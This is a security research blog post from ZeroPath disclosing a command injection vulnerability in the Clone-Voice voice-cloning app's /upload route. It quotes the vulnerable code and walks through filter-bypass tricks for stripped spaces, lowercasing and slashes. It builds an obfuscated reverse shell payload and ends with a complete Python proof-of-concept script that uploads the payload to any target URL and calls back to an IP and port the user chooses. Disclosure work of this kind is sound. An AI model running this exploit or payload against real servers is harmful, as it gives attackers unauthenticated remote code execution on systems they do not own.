---
schema_version: "1.0.0"
document_id: "d06b23226f2108413fe434e844964499410c7928990957c5c11a90da1330e51f"
company_key: "yc-zeropath"
company: "ZeroPath"
source_id: "yc-zeropath-news-import-51f20a74ff70"
canonical_url: "https://zeropath.com/blog/command-injection-vulnerability-clone-voice"
published_at: "2024-08-24T00:00:00+00:00"
first_seen_at: "2026-07-24T06:51:45.842756+00:00"
fetched_at: "2026-07-28T22:01:06.812214+00:00"
content_hash: "sha256:72f6fd8f0e18c95476899ff67aa006ee33e4703b225b97af85598cdd8be0bce5"
---

# Command Injection Vulnerability in Clone-Voice Project

# Command Injection Vulnerability in Clone-Voice Project


*By[Nathan Hrncirik](https://www.linkedin.com/in/nathan-hrncirik/) and[Raphael Karger](https://www.linkedin.com/in/raphael-karger/) , Security Researchers at ZeroPath*


ZeroPath security researchers discovered a critical command injection vulnerability in[Clone-Voice](https://github.com/jianchang512/clone-voice) , a popular open-source project for voice cloning with an unauthenticated web interface. This vulnerability, when exploited, allows malicious actors to execute arbitrary commands on the server hosting the Clone-Voice application.


*Proof of concept demo*


## Vulnerability Discovery + Details


ZeroPath's vulnerability scanner initially flagged a potential command injection vulnerability in the` /upload` route of the Clone-Voice application. Further investigation revealed that the vulnerability was indeed present, but exploiting it proved to be more challenging than initially anticipated due to several input processing steps.


The core issue lies in the use of` os.system()` without sanitizing user input in the file upload functionality. Here's the vulnerable code snippet from the` /upload` route:


```text
@app  .  route  (  '/upload'  ,   methods  =  [  'POST'  ]  )
def     upload  (  )  :
try  :
audio_file   =   request  .  files  [  'audio'  ]
save_dir   =   request  .  form  .  get  (  "save_dir"  ,  ''  )
save_dir   =   VOICE_DIR   if     not   save_dir   else   os  .  path  .  join  (  ROOT_DIR  ,     f'static/  {  save_dir  }  '  )
app  .  logger  .  info  (  f"[upload]  {  audio_file  .  filename  =  }  ,  {  save_dir  =  }  "  )
noextname  ,   ext   =   os  .  path  .  splitext  (  os  .  path  .  basename  (  audio_file  .  filename  .  lower  (  )  )  )
noextname   =   noextname  .  replace  (  ' '  ,     ''  )
if   audio_file   and   ext   in     [  ".wav"  ,     ".mp3"  ,     ".flac"  ]  :
name   =     f'  {  noextname  }  {  ext  }  '
if   os  .  path  .  exists  (  os  .  path  .  join  (  save_dir  ,     f'  {  noextname  }  {  ext  }  '  )  )  :
name   =     f'  {  datetime  .  datetime  .  now  (  )  .  strftime  (  "%m%d-%H%M%S"  )  }  -  {  noextname  }  {  ext  }  '
tmp_wav   =   os  .  path  .  join  (  TMP_DIR  ,     "tmp_"     +   name  )
audio_file  .  save  (  tmp_wav  )
if   ext   !=     '.wav'  :
name   =     f"  {  name  [  :  -  len  (  ext  )  ]  }  .wav"
savename   =   os  .  path  .  join  (  save_dir  ,   name  )
os  .  system  (  f'ffmpeg -hide_banner -y -i "  {  tmp_wav  }  " "  {  savename  }  "'  )
try  :
os  .  unlink  (  tmp_wav  )
except  :
pass
return   jsonify  (  {  'code'  :     0  ,     'msg'  :     'ok'  ,     "data"  :   name  }  )
else  :
return   jsonify  (  {  'code'  :     1  ,     'msg'  :     'not wav'  }  )
except   Exception   as   e  :
app  .  logger  .  error  (  f'[upload]error:   {  e  }  '  )
return   jsonify  (  {  'code'  :     2  ,     'msg'  :     'error'  }  )
```


The problem is simple - the filename retrieved from` request.files\['audio'\]` is directly interpolated into the` os.system()` function. However, getting a PoC quickly became reminiscent of a Capture The Flag (CTF) competition, as our payload has to go through multiple layers of processing:


1. Spaces are stripped
2. All characters are converted to lowercase
3. Any forward slash cuts off all subsequent characters


Our first attempt was relatively simple:


```text
hello$(id).mp3


```


And successfully executed. However, attempts to run more complex commands with spaces, like` cat app.py` , fail due to the space character being stripped.


### Attempting to Overcome Spaces


To bypass the space restriction, we attempted to use the` ${IFS}` variable, a common technique in CTFs and command injection bypasses:


```text
hello$(echo${IFS}test123).mp3


```


This fails because the input was converted to lowercase, rendering the` ${IFS}` variable unusable.


This is the moment coming up with the PoC started feeling like a CTF challenge to me. After deciding this was like a CTF, I set out to try and just get` cat flag.txt` to work before a full reverse shell. It turns out you can do this using input redirection:


```text
hello$(cat<flag.txt).flac


```


The above payload successfully printed the contents of the` flag.txt` file. However, we were limited to reading files in the current directory, because of the slash filtering.


We explored several different approaches to working around that filter:


1.


Slicing the` $HOME` variable, which always has a leading slash:


```text
cat<${HOME:0:1}flag.txt


```


This worked in bash when testing, but failed in the target environment because $HOME was being converted to lowercase..., I forgot about that.


2.


Attempting to use bash uppercase conversion:


```text
a=home&&b=${a^^}


```


In the above payload, I set the` a` variable equal to the lowercase string home, and then we use parameter expansion with case modification to convert the` a` variable to uppercase, and store in the` b` variable. This successfully sets the` b` variable to "HOME", allowing us to use` ${!b}` to get "/home/user", getting us the forward slash we need!


I quickly came up with this PoC:


```text
a=home&&b=${a^^}&&cat<${!b:0:1}flag.txt


```


Which worked in my bash terminal, but not on the server :(. Unfortunately for me,` sh` lacks these advanced string manipulation features, and os.system() uses` sh` , not bash.


### The Slash Breakthrough


After stepping away from the computer a while and then coming back, we realized that the` pwd` command also always starts with a forward slash, which we could grab using a nested parameter expansion technique:


```text
pwd=$(pwd)&&cat<${pwd%${pwd#?}}flag.txt


```


The above payload worked! We were able to cat the pretend /flag.txt file - and for a reverse shell, we could repeat the same process for space characters.


### Getting a space


With the ability to generate a slash, we can read most files. Our target payload also contains spaces:


` bash -i >& /dev/tcp/127.0.0.1/1337 0>&1`


We have many default linux commands available to us, but the` date` command was the best fit. The output of date will always contain a space in character four, no matter when you run it. Using the sh magic below, we were able to get another variable with a space character stored:


```text
d=$(date)&&f=${d%${d#????}}&&s=${f#???}


```


So now we have everything we need to generate a reverse shell payload, we just need to put it together.


```text
hello`pwd=$(pwd)&&d=$(date)&&f=${d%${d#????}}&&s=${f#???}&&bash${s}-c${s}\"bash${s}-i${s}>&${s}${pwd%${pwd#?}}dev${pwd%${pwd#?}}tcp${pwd%${pwd#?}}127.0.0.1${pwd%${pwd#?}}4242${s}0>&1"`.flac


```


## Proof of Concept


```text
#!/usr/bin/env python3


import   argparse
import   requests


def     execute_rce  (  url  ,   ip  ,   port  )  :
print  (  "[!] Clone-Voice RCE PoC"  )
print  (  f"[*] Target URL:   {  url  }  "  )
print  (  f"[*] Reverse shell:   {  ip  }  :  {  port  }  "  )


# beautiful payload
payload   =     f"hello`pwd=$(pwd)&&d=$(date)&&f=${{d%${{d#????}}}}&&s=${{f#???}}&&bash${{s}}-c${{s}}\"bash${{s}}-i${{s}}>&${{s}}${{pwd%${{pwd#?}}}}dev${{pwd%${{pwd#?}}}}tcp${{pwd%${{pwd#?}}}}  {  ip  }  ${{pwd%${{pwd#?}}}}  {  port  }  ${{s}}0>&1\"`.flac"
print  (  f"[*] Generated payload filename:   {  payload  }  "  )
print  (  "[*] Sending malicious upload"  )


files   =     {  'audio'  :     (  payload  ,     "test"  )  }


try  :
response   =   requests  .  post  (  f"  {  url  }  /upload"  ,   files  =  files  )
response  .  raise_for_status  (  )
result   =   response  .  json  (  )
print  (  "[+] Upload successful!"  )
print  (  "[*] Server response:"  )
print  (  f"    Code:   {  result  [  'code'  ]  }  "  )
print  (  f"    Message:   {  result  [  'msg'  ]  }  "  )
if     'data'     in   result  :
print  (  f"    Data:   {  result  [  'data'  ]  }  "  )
print  (  "[*] If the exploit was successful, you should receive a reverse shell connection."  )
except   requests  .  exceptions  .  RequestException   as   e  :
print  (  f"[-] Error occurred while uploading:   {  e  }  "  )


def     main  (  )  :
parser   =   argparse  .  ArgumentParser  (  description  =  'Clone-Voice RCE PoC'  )
parser  .  add_argument  (  '--url'  ,   required  =  True  ,     help  =  'Target URL (e.g., http://localhost:9000)'  )
parser  .  add_argument  (  '--shell'  ,   nargs  =  2  ,   metavar  =  (  'IP'  ,     'PORT'  )  ,   required  =  True  ,     help  =  'Reverse shell IP and port'  )


args   =   parser  .  parse_args  (  )


execute_rce  (  args  .  url  ,   args  .  shell  [  0  ]  ,   args  .  shell  [  1  ]  )


if   __name__   ==     "__main__"  :
main  (  )
```


## Want to chat?


This command injection vulnerability gives a partial demonstration of ZeroPath's scanning capabilities. While many vulnerability scanners might have flagged this issue, ZeroPath's ability to automatically investigate results across large numbers of repositories was a big help with initial identification.


If you're interested in how you can use ZeroPath to improve your code security, please set up a[call](https://cal.com/team/zeropath/chat) with our team!


## Legal Disclaimer


The Proof of Concept (PoC) provided serves solely for educational and research objectives. Its purpose is to showcase a specific vulnerability and aid in comprehending associated security risks.


The creators and contributors of this blog disclaim all liability for the improper use or any damage or harm resulting from the use of this PoC. By utilizing this PoC, you consent to use it in a responsible manner and at your own risk.
